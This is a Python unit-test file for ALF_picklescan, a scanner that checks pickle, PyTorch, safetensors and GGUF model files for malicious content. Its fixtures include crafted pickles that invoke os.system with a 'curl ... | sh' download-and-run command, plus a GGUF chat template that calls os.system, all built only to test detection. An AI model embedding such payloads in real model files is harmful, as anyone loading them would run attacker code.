#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Testes rápidos do ALF_picklescan.

Todos os ficheiros de teste são gerados aqui mesmo e são inofensivos: nenhum
executa código. Um pickle "malicioso" nestes testes apenas *referencia* uma
função perigosa, sem a chamar.

Uso:
    python -m unittest discover -s tests -v
    python tests/test_smoke.py
"""

import collections
import json
import pickle
import struct
import subprocess
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import ALF_picklescan as core  # noqa: E402


# Referencia os.system sem a chamar: serve para testar a deteção.
SUSPICIOUS_PICKLE = b"cposix\nsystem\n(S'echo hi'\ntR."


def benign_pickle() -> bytes:
    return pickle.dumps({"pesos": [1, 2, 3], "nota": "amostra inofensiva"}, protocol=4)


def write(path: Path, data: bytes) -> Path:
    path.write_bytes(data)
    return path


def make_safetensors(path: Path, header: dict, body: bytes) -> Path:
    raw = json.dumps(header).encode("utf-8")
    return write(path, struct.pack("<Q", len(raw)) + raw + body)


def gguf_string(texto: str) -> bytes:
    dados = texto.encode("utf-8")
    return struct.pack("<Q", len(dados)) + dados


def gguf_kv(chave: str, valor: str, tipo: int = 8) -> bytes:
    """Par chave/valor; tipo 8 é STRING. Sem valor quando o tipo não é válido."""
    corpo = gguf_string(valor) if tipo == 8 else b""
    return gguf_string(chave) + struct.pack("<I", tipo) + corpo


def make_gguf(path: Path, kvs=(), version: int = 3, kv_count=None) -> Path:
    fmt = "<Q" if version == 3 else "<I"
    total = len(kvs) if kv_count is None else kv_count
    cabecalho = (b"GGUF" + struct.pack("<I", version)
                 + struct.pack(fmt, 0) + struct.pack(fmt, total))
    return write(path, cabecalho + b"".join(kvs))


class Base(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        self.whitelist = core.load_whitelist()

    def tearDown(self):
        self._tmp.cleanup()

    def verify(self, path: Path, sha=None):
        checks, digest = core.verificar(path, sha, self.whitelist)
        label, action, code = core.veredicto(checks)
        return checks, digest, label, code

    def state_of(self, checks, nome):
        for c in checks:
            if c["nome"] == nome:
                return c["estado"]
        return None


class TestPickle(Base):
    def test_benign_pickle_with_hash_is_green(self):
        p = write(self.tmp / "modelo.pkl", benign_pickle())
        esperado = core.sha256_of(p)
        checks, digest, label, code = self.verify(p, esperado)
        self.assertEqual(digest, esperado)
        self.assertEqual(label, "VERDE", checks)
        self.assertEqual(code, 0)
        self.assertEqual(self.state_of(checks, "Imports perigosos"), core.OK)
        self.assertEqual(self.state_of(checks, "Imports fora da whitelist"), core.OK)

    def test_without_hash_is_never_green(self):
        p = write(self.tmp / "modelo.pkl", benign_pickle())
        checks, _digest, label, code = self.verify(p)
        self.assertEqual(label, "AMARELO", checks)
        self.assertEqual(code, 1)
        self.assertEqual(self.state_of(checks, "Integridade (hash)"), core.AVISO)

    def test_hash_mismatch_is_red(self):
        p = write(self.tmp / "modelo.pkl", benign_pickle())
        _checks, _digest, label, code = self.verify(p, "0" * 64)
        self.assertEqual(label, "VERMELHO")
        self.assertEqual(code, 2)

    def test_dangerous_import_is_red(self):
        p = write(self.tmp / "mau.pkl", SUSPICIOUS_PICKLE)
        checks, _digest, label, code = self.verify(p, core.sha256_of(p))
        self.assertEqual(label, "VERMELHO", checks)
        self.assertEqual(code, 2)
        self.assertEqual(self.state_of(checks, "Imports perigosos"), core.REPROVADO)

    def test_picklescan_runs_at_all(self):
        """O picklescan tem de ser encontrado (comando, embutido ou python -m)."""
        p = write(self.tmp / "modelo.pkl", benign_pickle())
        code, saida = core.run_picklescan(p)
        self.assertIsNotNone(code, "picklescan não foi encontrado: " + str(saida))

    def test_picklescan_effective_on_dangerous_pickle(self):
        """A amostra perigosa tem de ser detetada, não apenas o ALF_picklescan."""
        p = write(self.tmp / "mau.pkl", SUSPICIOUS_PICKLE)
        code, _saida = core.run_picklescan(p)
        self.assertEqual(code, 1)

    def test_executable_inside_pytorch_zip_is_red(self):
        p = self.tmp / "modelo.bin"
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("archive/data.pkl", benign_pickle())
            z.writestr("archive/lib.so", b"\x7fELF falso")
        checks, _digest, label, code = self.verify(p, core.sha256_of(p))
        self.assertEqual(label, "VERMELHO", checks)
        self.assertEqual(self.state_of(checks, "Ficheiros executáveis dentro do modelo"),
                         core.REPROVADO)

    def test_clean_pytorch_zip_has_no_executable_alert(self):
        p = self.tmp / "limpo.bin"
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("archive/data.pkl", benign_pickle())
            z.writestr("archive/version", b"3\n")
        checks, _digest, _label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Ficheiros executáveis dentro do modelo"), core.OK)

    def test_report_is_written(self):
        p = write(self.tmp / "modelo.pkl", benign_pickle())
        checks, digest, label, code = self.verify(p, core.sha256_of(p))
        report = core.gerar_relatorio(p, digest, label, "Aprovado", checks)
        self.assertTrue(Path(report).is_file())
        texto = Path(report).read_text(encoding="utf-8")
        self.assertIn(digest, texto)
        self.assertIn("Limitações", texto)
        Path(report).unlink()


# Pickle que referencia os.system com um comando de download: o comando nunca é executado.
PAYLOAD_PICKLE = b"cposix\nsystem\n(S'curl -fsSL http://203.0.113.9/x.sh | sh'\ntR."

# Pickle que referencia uma função de ofuscação (nunca é chamada).
CODECS_PICKLE = b"c_codecs\nencode\n(Vhello\ntR."


class TestPayload(Base):
    def test_command_inside_pickle_is_shown(self):
        p = write(self.tmp / "mau.pkl", PAYLOAD_PICKLE)
        checks, _digest, label, code = self.verify(p, core.sha256_of(p))
        self.assertEqual(label, "VERMELHO", checks)
        self.assertEqual(code, 2)
        evidencia = next(c["detalhe"] for c in checks
                         if c["nome"] == "Payload das chamadas suspeitas")
        self.assertIn("curl -fsSL http://203.0.113.9/x.sh | sh", evidencia)
        self.assertIn("posix.system", evidencia)

    def test_command_text_is_flagged(self):
        p = write(self.tmp / "mau.pkl", PAYLOAD_PICKLE)
        checks, _digest, _label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Comandos, URLs ou ofuscação no conteúdo"),
                         core.REPROVADO)

    def test_clean_pickle_has_no_payload_alert(self):
        p = write(self.tmp / "limpo.pkl", benign_pickle())
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Payload das chamadas suspeitas"), core.OK)
        self.assertEqual(self.state_of(checks, "Comandos, URLs ou ofuscação no conteúdo"), core.OK)
        self.assertEqual(label, "VERDE", checks)

    def test_url_alone_warns_but_does_not_condemn(self):
        """Um URL sem imports perigosos é sinal de atenção, não prova de ataque."""
        p = write(self.tmp / "nota.pkl", pickle.dumps(
            {"fonte": "https://exemplo.invalid/modelo"}, protocol=4))
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Comandos, URLs ou ofuscação no conteúdo"),
                         core.AVISO)
        self.assertEqual(label, "AMARELO", checks)

    def test_obfuscation_module_is_red(self):
        p = write(self.tmp / "cod.pkl", CODECS_PICKLE)
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(label, "VERMELHO", checks)
        self.assertEqual(self.state_of(checks, "Imports perigosos"), core.REPROVADO)

    def test_long_encoded_block_warns(self):
        p = write(self.tmp / "blob.pkl", pickle.dumps({"b": "QUJD" * 40}, protocol=4))
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Comandos, URLs ou ofuscação no conteúdo"),
                         core.AVISO)
        self.assertEqual(label, "AMARELO", checks)

    def test_payload_inside_torch_zip_is_found(self):
        p = self.tmp / "modelo.bin"
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("archive/data.pkl", PAYLOAD_PICKLE)
            z.writestr("archive/version", b"3\n")
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(label, "VERMELHO", checks)
        evidencia = next(c["detalhe"] for c in checks
                         if c["nome"] == "Payload das chamadas suspeitas")
        self.assertIn("curl", evidencia)

    def test_report_shows_what_to_do_when_red(self):
        p = write(self.tmp / "mau.pkl", PAYLOAD_PICKLE)
        checks, digest, label, _code = self.verify(p, core.sha256_of(p))
        report = core.gerar_relatorio(p, digest, label, "Não usar", checks)
        texto = Path(report).read_text(encoding="utf-8")
        self.assertIn("O que fazer agora", texto)
        self.assertIn("weights_only=True", texto)
        Path(report).unlink()

    def test_report_has_no_advice_when_green(self):
        p = write(self.tmp / "limpo.pkl", benign_pickle())
        checks, digest, label, _code = self.verify(p, core.sha256_of(p))
        report = core.gerar_relatorio(p, digest, label, "Aprovado", checks)
        self.assertNotIn("O que fazer agora", Path(report).read_text(encoding="utf-8"))
        Path(report).unlink()


class TestTranslatedChecks(Base):
    """A caixa "Verification details" tem de seguir o idioma escolhido."""

    def checks(self):
        p = write(self.tmp / "mau.pkl", PAYLOAD_PICKLE)
        checks, _digest = self.verify(p, core.sha256_of(p))[0:2]
        return checks

    def test_every_check_has_a_key_in_every_language(self):
        from i18n import LANGUAGES, STRINGS
        for c in self.checks():
            self.assertIn(c["chave"], STRINGS["en"], c["nome"])
            for code, _name in LANGUAGES:
                self.assertIn(c["chave"], STRINGS[code], f"{code}: {c['chave']}")

    def test_titles_and_details_are_never_raw_keys_or_placeholders(self):
        from i18n import LANGUAGES
        for c in self.checks():
            for code, _name in LANGUAGES:
                nome, detalhe = core.texto_check(c, code)
                self.assertNotIn("chk_", nome, f"{code}: {nome}")
                self.assertNotIn("{", detalhe, f"{code}: {c['chave']}")
                self.assertTrue(nome and detalhe, f"{code}: {c['chave']} vazio")

    def test_details_are_really_translated(self):
        checks = self.checks()
        alvo = next(c for c in checks if c["nome"] == "Payload das chamadas suspeitas")
        txt = {
            "pt": core.texto_check(alvo, "pt")[1],
            "fr": core.texto_check(alvo, "fr")[1],
            "de": core.texto_check(alvo, "de")[1],  # idioma inexistente: cai para inglês
            "zh": core.texto_check(alvo, "zh")[1],
        }
        self.assertIn("recebe:", txt["pt"])
        self.assertIn("reçoit", txt["fr"])
        self.assertIn("receives", txt["de"])
        self.assertIn("接收", txt["zh"])
        for t_ in txt.values():
            self.assertIn("curl", t_)  # o payload aparece em qualquer idioma

    def test_file_row_is_translated(self):
        checks = self.checks()
        arquivo = checks[0]
        self.assertEqual(core.texto_check(arquivo, "pt")[0], "Ficheiro")
        self.assertEqual(core.texto_check(arquivo, "en")[0], "File")
        self.assertEqual(core.texto_check(arquivo, "zh")[0], "文件")

    def test_report_follows_the_language(self):
        p = write(self.tmp / "mau.pkl", PAYLOAD_PICKLE)
        checks, digest, label, _code = self.verify(p, core.sha256_of(p))
        fr = core.gerar_relatorio(p, digest, label, "Ne pas utiliser", checks, "fr")
        texto = Path(fr).read_text(encoding="utf-8")
        self.assertIn("rapport de vérification", texto)
        self.assertIn("Limites :", texto)
        self.assertIn("Ne chargez pas ce fichier", texto)
        self.assertNotIn("Limitações", texto)
        self.assertNotIn("state_", texto)
        self.assertNotIn("chk_", texto)
        self.assertIn("ÉCHEC", texto)  # estado REPROVADO em francês
        Path(fr).unlink()

    def test_legacy_detalhe_field_stays_portuguese(self):
        for c in self.checks():
            self.assertTrue(c["detalhe"])
            self.assertEqual(c["detalhe"], core.texto_check(c, "pt")[1])


class TestOwnLayer(Base):
    """A camada própria tem de detetar sozinha, mesmo que o picklescan diga
    que está tudo limpo. Mockamos o picklescan para isolar a nossa análise."""

    def verify_own(self, path):
        with mock.patch.object(core, "run_picklescan",
                               return_value=(0, "no suspicious global found")):
            return self.verify(path, core.sha256_of(path))

    def test_pydoc_locate_is_flagged(self):
        p = write(self.tmp / "pydoc.pkl", b"cpydoc\nlocate\n(S'os'\ntR.")
        checks, _digest, label, _code = self.verify_own(p)
        self.assertIn(self.state_of(checks, "Imports perigosos"),
                      (core.REPROVADO, core.AVISO))
        self.assertNotEqual(label, "VERDE", checks)

    def test_timeit_is_red(self):
        p = write(self.tmp / "timeit.pkl", b"ctimeit\ntimeit\n(S'pass'\ntR.")
        checks, _digest, label, code = self.verify_own(p)
        self.assertEqual(self.state_of(checks, "Imports perigosos"), core.REPROVADO)
        self.assertEqual(label, "VERMELHO", checks)
        self.assertEqual(code, 2)

    def test_pip_internal_is_red(self):
        p = write(self.tmp / "pip.pkl", b"cpip._internal\nutils\n(S'x'\ntR.")
        checks, _digest, label, _code = self.verify_own(p)
        self.assertEqual(self.state_of(checks, "Imports perigosos"), core.REPROVADO)
        self.assertEqual(label, "VERMELHO", checks)

    def test_functools_alone_is_yellow_not_red(self):
        p = write(self.tmp / "func.pkl", b"cfunctools\npartial\n(K\x01tR.")
        checks, _digest, label, _code = self.verify_own(p)
        self.assertEqual(self.state_of(checks, "Imports perigosos"), core.OK)
        self.assertEqual(self.state_of(checks, "Imports de indireção"), core.AVISO)
        self.assertEqual(label, "AMARELO", checks)

    def test_indirection_alongside_dangerous_import_is_red(self):
        p = write(self.tmp / "mau2.pkl",
                  b"cfunctools\npartial\n(K\x01tRcos\nsystem\n(S'id'\ntR.")
        checks, _digest, label, _code = self.verify_own(p)
        self.assertEqual(self.state_of(checks, "Imports perigosos"), core.REPROVADO)
        self.assertEqual(self.state_of(checks, "Imports de indireção"), core.REPROVADO)
        self.assertEqual(label, "VERMELHO", checks)

    def test_default_whitelist_excludes_dangerous_and_indirection(self):
        raizes = {linha.split(".", 1)[0] for linha in core.DEFAULT_WHITELIST.splitlines()
                  if linha.strip() and not linha.strip().startswith("#")}
        self.assertFalse(raizes & core.DANGEROUS_MODULES,
                         f"whitelist com módulos perigosos: {raizes & core.DANGEROUS_MODULES}")
        self.assertFalse(raizes & core.SUSPICIOUS_INDIRECTION,
                         f"whitelist com indireção: {raizes & core.SUSPICIOUS_INDIRECTION}")

    def test_benign_ordered_dict_with_hash_is_green(self):
        p = write(self.tmp / "ordenado.pkl",
                  pickle.dumps(collections.OrderedDict({"pesos": [1, 2, 3]}), protocol=4))
        checks, _digest, label, _code = self.verify_own(p)
        self.assertEqual(label, "VERDE", checks)
        self.assertEqual(self.state_of(checks, "Imports de indireção"), core.OK)
        self.assertEqual(self.state_of(checks, "Imports fora da whitelist"), core.OK)


class TestSafetensors(Base):
    def test_valid_safetensors(self):
        p = make_safetensors(self.tmp / "modelo.safetensors",
                             {"w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]}},
                             b"\x00\x00\x80?")
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Estrutura safetensors"), core.OK)
        self.assertEqual(label, "VERDE", checks)

    def test_offsets_outside_file(self):
        p = make_safetensors(self.tmp / "modelo.safetensors",
                             {"w": {"dtype": "F32", "shape": [1], "data_offsets": [0, 999]}},
                             b"\x00\x00\x80?")
        estado, detalhe = core.check_safetensors(p)
        self.assertEqual(estado, core.REPROVADO, detalhe)

    def test_header_bigger_than_file(self):
        p = write(self.tmp / "modelo.safetensors", struct.pack("<Q", 10**9) + b"{}")
        estado, _detalhe = core.check_safetensors(p)
        self.assertEqual(estado, core.REPROVADO)

    def test_tensor_size_matching_shape_is_green(self):
        p = make_safetensors(self.tmp / "certo.safetensors",
                             {"w": {"dtype": "F32", "shape": [2, 2],
                                    "data_offsets": [0, 16]}},
                             b"\x00" * 16)
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Estrutura safetensors"), core.OK)
        self.assertEqual(label, "VERDE", checks)

    def test_tensor_size_not_matching_shape_is_red(self):
        p = make_safetensors(self.tmp / "tamanho.safetensors",
                             {"w": {"dtype": "F32", "shape": [2, 2],
                                    "data_offsets": [0, 12]}},
                             b"\x00" * 12)
        estado, detalhe = core.check_safetensors(p)
        self.assertEqual(estado, core.REPROVADO)
        self.assertIn("w", detalhe("pt"))
        self.assertIn("16", detalhe("pt"))

    def test_overlapping_tensors_are_red(self):
        p = make_safetensors(self.tmp / "sobreposto.safetensors",
                             {"a": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
                              "b": {"dtype": "F32", "shape": [1], "data_offsets": [2, 6]}},
                             b"\x00" * 6)
        estado, detalhe = core.check_safetensors(p)
        self.assertEqual(estado, core.REPROVADO)
        self.assertIn("a", detalhe("pt"))

    def test_unknown_dtype_is_yellow(self):
        p = make_safetensors(self.tmp / "dtype.safetensors",
                             {"w": {"dtype": "XYZ", "shape": [1], "data_offsets": [0, 4]}},
                             b"\x00" * 4)
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Estrutura safetensors"), core.AVISO)
        self.assertEqual(label, "AMARELO", checks)

    def test_invalid_json_header(self):
        p = write(self.tmp / "modelo.safetensors", struct.pack("<Q", 4) + b"nope")
        estado, _detalhe = core.check_safetensors(p)
        self.assertEqual(estado, core.REPROVADO)


class TestGGUF(Base):
    def test_valid_gguf(self):
        p = write(self.tmp / "modelo.gguf", b"GGUF" + struct.pack("<I", 3) + b"\x00" * 32)
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Estrutura GGUF"), core.OK)
        self.assertEqual(label, "VERDE", checks)

    def test_unknown_version_warns(self):
        p = write(self.tmp / "modelo.gguf", b"GGUF" + struct.pack("<I", 9) + b"\x00" * 32)
        estado, _detalhe = core.check_gguf(p)
        self.assertEqual(estado, core.AVISO)

    def test_bad_magic(self):
        p = write(self.tmp / "modelo.gguf", b"NOPE" + struct.pack("<I", 3))
        estado, _detalhe = core.check_gguf(p)
        self.assertEqual(estado, core.REPROVADO)


class TestGGUFTemplate(Base):
    def test_metadata_and_benign_template_are_green(self):
        p = make_gguf(self.tmp / "modelo.gguf", [
            gguf_kv("general.name", "modelo de teste"),
            gguf_kv(core.GGUF_TEMPLATE_KEY,
                    "{% for m in messages %}{{ m['content'] }}{% endfor %}"),
        ])
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Metadados GGUF"), core.OK)
        self.assertEqual(self.state_of(checks, "Template de chat (GGUF)"), core.OK)
        self.assertEqual(label, "VERDE", checks)

    def test_v2_header_is_read(self):
        p = make_gguf(self.tmp / "v2.gguf", [gguf_kv("general.name", "teste")], version=2)
        metadados, problema = core.read_gguf_metadata(p)
        self.assertIsNone(problema)
        self.assertEqual(metadados["general.name"], "teste")

    def test_array_of_strings_is_skipped(self):
        itens = b"".join(gguf_string(x) for x in ("a", "b", "c"))
        array = (gguf_string("tokenizer.ggml.tokens") + struct.pack("<I", 9)
                 + struct.pack("<I", 8) + struct.pack("<Q", 3) + itens)
        p = make_gguf(self.tmp / "array.gguf",
                      [array, gguf_kv(core.GGUF_TEMPLATE_KEY, "{{ messages }}")])
        metadados, problema = core.read_gguf_metadata(p)
        self.assertIsNone(problema)
        self.assertIn(core.GGUF_TEMPLATE_KEY, metadados)

    def test_template_with_code_is_red(self):
        p = make_gguf(self.tmp / "mau.gguf", [
            gguf_kv(core.GGUF_TEMPLATE_KEY, "{{ __import__('os').system('id') }}"),
        ])
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Template de chat (GGUF)"), core.REPROVADO)
        self.assertEqual(label, "VERMELHO", checks)

    def test_template_with_marker_only_is_yellow(self):
        p = make_gguf(self.tmp / "duvidoso.gguf", [
            gguf_kv(core.GGUF_TEMPLATE_KEY, "{{ os.hostname }}"),
        ])
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Template de chat (GGUF)"), core.AVISO)
        self.assertEqual(label, "AMARELO", checks)

    def test_truncated_metadata_is_yellow(self):
        p = write(self.tmp / "cortado.gguf",
                  b"GGUF" + struct.pack("<I", 3) + struct.pack("<QQ", 0, 1)
                  + gguf_string(core.GGUF_TEMPLATE_KEY) + struct.pack("<I", 8)
                  + struct.pack("<Q", 1000) + b"abc")
        metadados, problema = core.read_gguf_metadata(p)
        self.assertIsNotNone(problema)
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Metadados GGUF"), core.AVISO)
        self.assertEqual(label, "AMARELO", checks)

    def test_absurd_kv_count_is_yellow_without_crashing(self):
        p = make_gguf(self.tmp / "absurdo.gguf", [], kv_count=10 ** 7)
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Metadados GGUF"), core.AVISO)
        self.assertEqual(label, "AMARELO", checks)

    def test_nested_array_is_yellow(self):
        aninhado = (gguf_string("x") + struct.pack("<I", 9)
                    + struct.pack("<I", 9) + struct.pack("<Q", 0))
        p = make_gguf(self.tmp / "aninhado.gguf", [aninhado])
        _meta, problema = core.read_gguf_metadata(p)
        self.assertEqual(problema[0], "d_gguf_nested")

    def test_unknown_type_is_yellow(self):
        p = make_gguf(self.tmp / "tipo.gguf", [gguf_kv("x", "", tipo=99)])
        _meta, problema = core.read_gguf_metadata(p)
        self.assertEqual(problema[0], "d_gguf_type")
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(label, "AMARELO", checks)


class TestMisc(Base):
    def test_unknown_format_warns(self):
        p = write(self.tmp / "modelo.xyz", b"texto qualquer")
        checks, _digest, label, _code = self.verify(p, core.sha256_of(p))
        self.assertEqual(self.state_of(checks, "Formato"), core.AVISO)
        self.assertEqual(label, "AMARELO")

    def test_sha256_known_vector(self):
        p = write(self.tmp / "a.bin", b"abc")
        self.assertEqual(core.sha256_of(p),
                         "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")

    def test_fmt_size(self):
        self.assertEqual(core.fmt_size(512), "512 B")
        self.assertEqual(core.fmt_size(2048), "2.00 KB")


class TestJson(Base):
    def test_json_report_is_valid_json_in_the_chosen_language(self):
        p = write(self.tmp / "modelo.pkl", benign_pickle())
        with mock.patch.object(core, "run_picklescan",
                               return_value=(0, "no suspicious global found")):
            checks, digest = core.verificar(p, core.sha256_of(p), self.whitelist)
        label, acao, code = core.veredicto(checks)
        dados = json.loads(core.json_report(p, digest, label, acao, checks, code, "fr"))
        self.assertEqual(dados["exit_code"], code)
        self.assertEqual(dados["verdict"], "VERT")
        self.assertEqual(dados["action"], "Approuvé avec limitations")
        self.assertTrue(dados["checks"])
        self.assertEqual({"name", "state", "detail"}, set(dados["checks"][0]))

    def test_cli_json_output_is_parseable(self):
        p = write(self.tmp / "modelo.pkl", benign_pickle())
        r = subprocess.run(
            [sys.executable, str(ROOT / "ALF_picklescan.py"), str(p),
             "--sha256", core.sha256_of(p), "--json", "--lang", "en"],
            capture_output=True, text=True, encoding="utf-8",
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        self.assertEqual(r.returncode, 0, r.stderr)
        dados = json.loads(r.stdout)
        self.assertEqual(dados["language"], "en")
        self.assertEqual(dados["verdict"], "GREEN")
        self.assertEqual(dados["sha256"], core.sha256_of(p))


class TestI18n(unittest.TestCase):
    def test_every_language_has_every_key(self):
        from i18n import LANGUAGES, STRINGS
        base = set(STRINGS["en"])
        for code, _name in LANGUAGES:
            self.assertIn(code, STRINGS, f"idioma em falta: {code}")
            faltam = base - set(STRINGS[code])
            self.assertFalse(faltam, f"{code}: chaves em falta {sorted(faltam)}")

    def test_missing_key_falls_back_to_english(self):
        from i18n import t
        self.assertEqual(t("verify", "en"), "Verify model")
        self.assertEqual(t("chave_inexistente", "fr"), "chave_inexistente")


if __name__ == "__main__":
    unittest.main(verbosity=2)
